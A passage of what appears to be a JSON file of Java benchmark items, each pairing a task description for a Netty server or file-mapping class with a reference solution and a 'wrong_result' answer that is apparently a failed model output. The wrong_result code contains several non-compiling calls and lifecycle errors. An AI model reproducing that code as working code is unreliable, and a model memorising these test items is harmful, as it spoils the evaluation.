public int getPort() {\n        if (server == null || server.socket() == null) {\n            return -1;\n        }\n        return server.socket().getLocalPort();\n    }\n\n    private class MyHttpHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                String response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\nContent-Length: 11\\r\\n\\r\\nHello World\";\n                ByteBuf buf = Unpooled.copiedBuffer(response, CharsetUtil.UTF_8);\n                ctx.writeAndFlush(buf);\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 193,
    "Instruction": "Task Description: Implement a Java class that sets up a Netty-based TCP server for handling HTTP requests, with thread pool management for business logic processing and idle connection handling.\n\nClass Description: EmbedServer is a Netty-based HTTP server implementation that handles incoming requests using a thread pool for business logic processing. It manages server lifecycle (start/stop) and includes connection idle state detection.\n\nAttributes:\n- executorBiz: ExecutorBiz - Business logic executor for handling requests\n- thread: Thread - Server thread running the Netty event loop\n\nMethods:\n- start(String address, int port, String appname, String accessToken) -> void - Starts the Netty server on specified port with given configuration\n  - address: String - Server bind address\n  - port: int - Server bind port\n  - appname: String - Application name (unused in current implementation)\n  - accessToken: String - Authentication token for requests\n- stop() -> void - Stops the server and releases resources\n- EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) -> void - Constructor for the HTTP request handler\n  - executorBiz: ExecutorBiz - Business logic executor\n  - accessToken: String - Authentication token\n  - bizThreadPool: ThreadPoolExecutor - Thread pool for request processing\n- channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) -> void - Handles incoming HTTP requests\n  - ctx: ChannelHandlerContext - Netty channel context\n  - msg: FullHttpRequest - Incoming HTTP request\n- exceptionCaught(ChannelHandlerContext ctx, Throwable cause) -> void - Handles channel exceptions\n  - ctx: ChannelHandlerContext - Netty channel context\n  - cause: Throwable - Exception that occurred\n- userEventTriggered(ChannelHandlerContext ctx, Object evt) -> void - Handles idle state events\n  - ctx: ChannelHandlerContext - Netty channel context\n  - evt: Object - Triggered event (IdleStateEvent for idle connections)",
    "Canonical_solution": "import com.xxl.job.core.biz.ExecutorBiz;\nimport com.xxl.job.core.biz.impl.ExecutorBizImpl;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.concurrent.*;\n\npublic class EmbedServer {\n    private static final Logger logger = LoggerFactory.getLogger(EmbedServer.class);\n\n    private ExecutorBiz executorBiz;\n    private Thread thread;\n\n    public void start(final String address, final int port, final String appname, final String accessToken) {\n        executorBiz = new ExecutorBizImpl();\n        thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                EventLoopGroup bossGroup = new NioEventLoopGroup();\n                EventLoopGroup workerGroup = new NioEventLoopGroup();\n                ThreadPoolExecutor bizThreadPool = new ThreadPoolExecutor(\n                        0,\n                        200,\n                        60L,\n                        TimeUnit.SECONDS,\n                        new LinkedBlockingQueue<Runnable>(2000),\n                        new ThreadFactory() {\n                            @Override\n                            public Thread newThread(Runnable r) {\n                                return new Thread(r, \"xxl-rpc, EmbedServer bizThreadPool-\" + r.hashCode());\n                            }\n                        },\n                        new RejectedExecutionHandler() {\n                            @Override\n                            public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {\n                                throw new RuntimeException(\"xxl-job, EmbedServer bizThreadPool is EXHAUSTED!\");\n                            }\n                        });\n\n                try {\n                    ServerBootstrap bootstrap = new ServerBootstrap();\n                    bootstrap.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new ChannelInitializer<SocketChannel>() {\n                                @Override\n                                public void initChannel(SocketChannel channel) throws Exception {\n                                    channel.pipeline()\n                                            .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))\n                                            .addLast(new HttpServerCodec())\n                                            .addLast(new HttpObjectAggregator(5 * 1024 * 1024))\n                                            .addLast(new EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool));\n                                }\n                            })\n                            .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                    ChannelFuture future = bootstrap.bind(port).sync();\n                    logger.info(\">>>>>>>>>>> xxl-job remoting server start success, nettype = {}, port = {}\", EmbedServer.class, port);\n\n                    future.channel().closeFuture().sync();\n                } catch (InterruptedException e) {\n                    if (e instanceof InterruptedException) {\n                        logger.info(\">>>>>>>>>>> xxl-job remoting server stop.\");\n                    } else {\n                        logger.error(\">>>>>>>>>>> xxl-job remoting server error.\", e);\n                    }\n                } finally {\n                    try {\n                        workerGroup.shutdownGracefully();\n                        bossGroup.shutdownGracefully();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    public void stop() throws Exception {\n        if (thread!=null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        logger.info(\">>>>>>>>>>> xxl-job remoting server destroy success.\");\n    }\n\n    public static class EmbedHttpServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        private static final Logger logger = LoggerFactory.getLogger(EmbedHttpServerHandler.class);\n\n        private ExecutorBiz executorBiz;\n        private String accessToken;\n        private ThreadPoolExecutor bizThreadPool;\n\n        public EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) {\n            this.executorBiz = executorBiz;\n            this.accessToken = accessToken;\n            this.bizThreadPool = bizThreadPool;\n        }\n\n        @Override\n        protected void channelRead0(final ChannelHandlerContext ctx, FullHttpRequest msg) throws Exception {\n            bizThreadPool.execute(new Runnable() {\n                @Override\n                public void run() {\n                    String responseJson = \"{}\";\n                    FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(responseJson, CharsetUtil.UTF_8));\n                    response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/html;charset=UTF-8\");\n                    response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());\n                    ctx.writeAndFlush(response);\n                }\n            });\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            logger.error(\">>>>>>>>>>> xxl-job provider netty_http server caught exception\", cause);\n            ctx.close();\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                ctx.channel().close();\n                logger.debug(\">>>>>>>>>>> xxl-job provider netty_http server close an idle channel.\");\n            } else {\n                super.userEventTriggered(ctx, evt);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class EmbedServer {\n    private final ExecutorBiz executorBiz;\n    private final ThreadPoolExecutor bizThreadPool;\n    private Thread serverThread;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public EmbedServer(ExecutorBiz executorBiz, ThreadPoolExecutor bizThreadPool) {\n        this.executorBiz = executorBiz;\n        this.bizThreadPool = bizThreadPool;\n    }\n\n    public void start(String address, int port, String appname, String accessToken) {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new HttpObjectAggregator());\n                            pipeline.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                            pipeline.addLast(new EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool));\n                        }\n                    })\n                    .childOption(ChannelOption.SO_REUSEADDR, true)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(address, port).sync();\n            serverThread = new Thread(future.channel());\n            serverThread.start();\n\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        if (serverThread != null) {\n            serverThread.interrupt();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    private class EmbedHttpServerHandler extends ChannelInboundHandlerAdapter {\n        private final ExecutorBiz executorBiz;\n        private final String accessToken;\n        private final ThreadPoolExecutor bizThreadPool;\n\n        public EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) {\n            this.executorBiz = executorBiz;\n            this.accessToken = accessToken;\n            this.bizThreadPool = bizThreadPool;\n        }\n\n        @Override\n        public void channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) {\n            String authHeader = msg.headers().get(\"Authorization\");\n            if (authHeader == null || !authHeader.equals(accessToken)) {\n                FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.UNAUTHORIZED);\n                response.headers().set(\"Content-Type\", \"text/plain\");\n                response.content().writeBytes(\"Unauthorized\".getBytes(CharsetUtil.UTF_8));\n                ctx.write(response);\n                ctx.close();\n                return;\n            }\n\n            bizThreadPool.submit(() -> {\n                String responseMsg = \"Processed\";\n                FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                response.headers().set(\"Content-Type\", \"text/plain\");\n                response.content().writeBytes(responseMsg.getBytes(CharsetUtil.UTF_8));\n                ctx.writeAndFlush(response);\n            });\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n            if (evt instanceof IdleStateEvent) {\n                ctx.close();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 194,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 server using Netty framework, capable of handling incoming TCP connections with configurable port settings and proper resource management.\n\nClass Description: The Http2Server class is a Netty-based TCP server implementation that listens for HTTP/2 connections on a specified port. It manages server lifecycle including startup, shutdown, and resource cleanup, using Netty's event loop groups for efficient I/O handling.\n\nAttributes:\n- DEFAULT_PORT: int - Default port number (8080) used when no port is specified\n- bossGroup: EventLoopGroup - Netty event loop group for accepting incoming connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- bootstrap: ServerBootstrap - Netty server bootstrap for configuring server parameters\n\nMethods:\n- Http2Server() -> None - Constructor that initializes the event loop groups and server bootstrap\n- start(int port) -> void - Starts the server on the specified port, configures channel options and handlers, and binds to the port\n- shutdown() -> void - Gracefully shuts down the server and releases all resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class Http2Server {\n\n    public static int DEFAULT_PORT = 8080;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public Http2Server() {\n        this.bossGroup = new NioEventLoopGroup(1);\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new Http2ServerInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"HTTP/2\u670d\u52a1\u5668\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class Http2Server {\n    private static final int DEFAULT_PORT = 8080;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final ServerBootstrap bootstrap;\n\n    public Http2Server() {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.SO_REUSEADDR, true)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new Http2ServerCodec());\n                        pipeline.addLast(new Http2ServerHandler());\n                    }\n                })\n                .bind(port).sync().awaitUninterruptibly();\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 196,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using the Netty framework, capable of handling incoming client connections and processing messages.\n\nClass Description: The NettyTcpServer class is a TCP server implementation using Netty's non-blocking I/O. It manages server lifecycle (startup and shutdown) and handles client connections through configurable event loop groups and channel pipelines.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - The main Netty server configuration object\n- bossGroup: EventLoopGroup - Handles incoming connection requests\n- workerGroup: EventLoopGroup - Handles I/O operations for established connections\n- port: int - The port number the server listens on\n\nMethods:\n- NettyTcpServer(int port) -> void - Constructor that initializes the server with specified port\n- start() -> void - Starts the server, binds to the configured port, and begins accepting connections\n- shutdown() -> void - Gracefully shuts down the server and releases resources\n- NettyServerHandler (inner class) - Handles incoming messages and exceptions for client connections\n  - channelRead(ChannelHandlerContext, Object) -> void - Processes incoming messages\n  - exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class NettyTcpServer {\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public NettyTcpServer(int port) {\n        this.port = port;\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.serverBootstrap = new ServerBootstrap();\n    }\n\n    public void start() throws InterruptedException {\n        try {\n            serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(port))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new NettyServerHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture channelFuture = serverBootstrap.bind().sync();\n            channelFuture.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    private static class NettyServerHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n            // Message processing logic\n        }\n\n        @Override\n        public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyTcpServer {\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public NettyTcpServer(int port) {\n        this.serverBootstrap = new ServerBootstrap();\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.port = port;\n\n        serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new NettyServerHandler());\n                    }\n                });\n    }\n\n    public void start() {\n        serverBootstrap.bind(port).sync();\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    private class NettyServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            System.out.println(\"Received message: \" + msg);\n            ctx.fireChannelRead(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 20,
    "Instruction": "Task Description: Create a Java class that provides memory-mapped file access capabilities and process spawning functionality for inter-process communication scenarios.\n\nClass Description: FileChannelInteractor is a utility class that handles memory-mapped file operations and process management. It allows read-only memory mapping of files and provides functionality to spawn worker processes for IPC scenarios.\n\nAttributes:\n- fileChannel: FileChannel - The NIO FileChannel used for file operations\n- mapAddress: long - The memory address of the mapped file region\n- fileSize: long - The size of the mapped file in bytes\n\nMethods:\n- FileChannelInteractor(String filePath) -> void - Constructor that opens a file channel and maps the file into memory in read-only mode\n- getMemoryMappedAddress() -> long - Returns the memory address of the mapped file region\n- getFileSize() -> long - Returns the size of the mapped file\n- close() -> void - Closes the file channel and releases system resources\n- spawnWorkerProcess() -> void - Static method that spawns a worker process with the same command and arguments as the current process, adding a \"--worker\" flag",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelInteractor {\n\n    private FileChannel fileChannel;\n    private long mapAddress;\n    private long fileSize;\n\n    public FileChannelInteractor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mapAddress = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        fileChannel.close();\n    }\n\n    public static void spawnWorkerProcess() throws IOException {\n        ProcessHandle.Info info = ProcessHandle.current().info();\n        ArrayList<String> workerCommand = new ArrayList<>();\n        info.command().ifPresent(workerCommand::add);\n        info.arguments().ifPresent(args -> workerCommand.addAll(Arrays.asList(args)));\n        workerCommand.add(\"--worker\");\n        new ProcessBuilder()\n                .command(workerCommand)\n                .inheritIO()\n                .redirectOutput(ProcessBuilder.Redirect.PIPE)\n                .start()\n                .getInputStream()\n                .transferTo(System.out);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private long mapAddress;\n    private long fileSize;\n\n    public FileChannelInteractor(String filePath) throws IOException {\n        File file = new File(filePath);\n        FileInputStream fis = new FileInputStream(file);\n        fileChannel = FileChannel.open(file.toPath(), StandardOpenOption.READ);\n        fileSize = fileChannel.size();\n        MappedByteBuffer bb = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize);\n        mapAddress = bb.address();\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public static void spawnWorkerProcess() throws IOException {\n        ProcessBuilder pb = new ProcessBuilder();\n        pb.inheritIO();\n        pb.command(Runtime.getRuntime().exec(new String[]{System.getProperty(\"java.home\") + \"/bin/java\"}), \"--worker\");\n        pb.start();\n    }\n}"
  },
  {
    "Task_id": 201,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle multiple client connections and manage them through a channel group.\n\nClass Description: The ChatServer class is a Netty-based TCP server that manages client connections through channel groups. It provides methods to start the server on a specified address and properly shut it down while releasing all resources.\n\nAttributes:\n- channelGroup: [ChannelGroup] - Maintains all active client channels for group operations\n- bossGroup: [EventLoopGroup] - Handles incoming connection requests\n- workGroup: [EventLoopGroup] - Handles I/O operations for established connections\n- channel: [Channel] - Represents the server's listening channel\n\nMethods:\n- start: [Name]([InetSocketAddress address]) -> [ChannelFuture] - Starts the server on the specified address, configures server options, and initializes the channel pipeline with handlers\n- destroy: [Name]() -> [void] - Properly shuts down the server by closing all channels and releasing thread resources",
    "Canonical_solution": "import java.net.InetSocketAddress;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.ImmediateEventExecutor;\n\npublic class ChatServer {\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(ImmediateEventExecutor.INSTANCE);\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workGroup = new NioEventLoopGroup();\n    private Channel channel;\n    \n    public ChannelFuture start(InetSocketAddress address) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChatServerInitializer(channelGroup))\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n        \n        ChannelFuture future = bootstrap.bind(address).syncUninterruptibly();\n        channel = future.channel();\n        return future;\n    }\n    \n    public void destroy() {\n        if(channel != null) {\n            channel.close();\n        }\n        \n        channelGroup.close();\n        workGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class ChatServer {\n    private final ChannelGroup channelGroup = new LocalChannelGroup();\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workGroup = new NioEventLoopGroup();\n    private Channel channel;\n\n    public ChannelFuture start(InetSocketAddress address) {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(bossGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.SO_REUSEADDR, true)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .childHandler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ch.pipeline().addLast(new MyChatHandler(channelGroup));\n                        channelGroup.add(ch);\n                    }\n                });\n\n        ChannelFuture future = bootstrap.bind(address);\n        channel = future.channel();\n        return future;\n    }\n\n    public void destroy() {\n        bossGroup.shutdownGracefully();\n        workGroup.shutdownGracefully();\n        if (channel != null) {\n            channel.close().awaitUninterruptibly();\n        }\n        channelGroup.close().awaitUninterruptibly();\n    }\n\n    private static class MyChatHandler extends SimpleChannelInboundHandler<String> {\n        private final ChannelGroup channelGroup;\n\n        public MyChatHandler(ChannelGroup group) {\n            this.channelGroup = group;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n            channelGroup.writeAndFlush(msg + \"\\n\");\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 208,
    "Instruction": "Task Description: Implement a Java class that creates a TCP server using Netty framework to handle HTTP file server functionality, including starting the server, configuring network options, and properly shutting down resources.\n\nClass Description: LoFileServer is a Netty-based HTTP file server that listens on a specified port, handles incoming HTTP requests, and manages server lifecycle operations. It uses Netty's non-blocking I/O model for high performance and includes proper resource cleanup.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nchannel: Channel - The Netty channel representing the server's listening socket\nLogger: Logger - SLF4J logger instance for logging server events\n\nMethods:\nstart(): void - Starts the Netty server on the specified port. Configures thread groups, channel options, and HTTP pipeline handlers. Throws InterruptedException if the port is already in use or if startup fails.\nshutdown(): void - Gracefully shuts down the server by closing the channel and releasing all associated resources. Handles any interruption during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class LoFileServer {\n    private static final Logger Logger = LoggerFactory.getLogger(LoFileServer.class);\n    private int port;\n    private Channel channel;\n\n    public LoFileServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        final EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            final ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.SO_SNDBUF, 1024*1024*10)\n                .option(ChannelOption.SO_RCVBUF, 1024*1024*10)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        socketChannel.pipeline().addLast(new HttpRequestDecoder());\n                        socketChannel.pipeline().addLast(new HttpResponseEncoder());\n                        socketChannel.pipeline().addLast(new ChunkedWriteHandler());\n                        socketChannel.pipeline().addLast(new HttpObjectAggregator(100 * 1024 * 1024));\n                        socketChannel.pipeline().addLast(new HttpFileServerHandler());\n                    }\n                });\n            \n            channel = b.bind(port).sync().channel();\n            Logger.info(\"Server started on port [{}]\", port);\n        } catch (Exception e) {\n            Logger.error(\"Port {} is already in use\", port);\n            throw e;\n        }\n    }\n\n    public void shutdown() {\n        if (this.channel != null) {\n            this.channel.close();\n            try {\n                this.channel.closeFuture().sync();\n            } catch (InterruptedException e) {\n                Logger.error(\"Error during server shutdown\", e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class LoFileServer {\n    private final int port;\n    private Channel channel;\n    private static final Logger logger = LoggerFactory.getLogger(LoFileServer.class);\n\n    public LoFileServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .option(ChannelOption.SO_REUSEADDR, true)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new HttpServerCodec());\n                            ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                            ch.pipeline().addLast(new FileServerHandler());\n                        }\n                    });\n\n            channel = bootstrap.bind(port).sync();\n            logger.info(\"Server started on port {}\", port);\n        } catch (Exception e) {\n            logger.error(\"Failed to start server\", e);\n            throw new InterruptedException(\"Server startup failed\");\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.closeFuture().awaitUninterrupted();\n            logger.info(\"Server shut down\");\n        }\n    }\n\n    private static class FileServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) {\n            String uri = request.uri();\n            FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n            ctx.write(response);\n            ctx.flush();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        